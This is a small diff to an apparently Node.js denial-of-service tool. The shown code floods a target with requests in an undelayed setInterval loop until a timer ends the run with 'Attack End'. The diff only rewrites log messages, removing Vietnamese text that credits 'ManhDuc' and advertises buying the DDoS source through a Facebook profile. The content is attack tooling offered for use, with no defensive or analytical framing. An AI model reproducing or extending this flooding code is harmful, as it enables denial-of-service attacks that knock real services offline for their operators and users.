@@ -66,7 +66,7 @@ function send_req(headers) {
 
 let init = function () {
     getHeaders().then(function (result) {
-        console.log('Attack Sent ! Cam On Vi Da Su Dung Cua ManhDuc');
+        console.log('Attack Sent!');
         setInterval(() => {
             send_req(result);
         });
@@ -74,7 +74,7 @@ let init = function () {
 };
 
 setTimeout(() => {
-    console.log('Attack End | Mua Source DDoS Ib facebook.com/profile.php?id=100086525015176');
+    console.log('Attack End');
     process.exit(0)
 }, time * 1000);
 
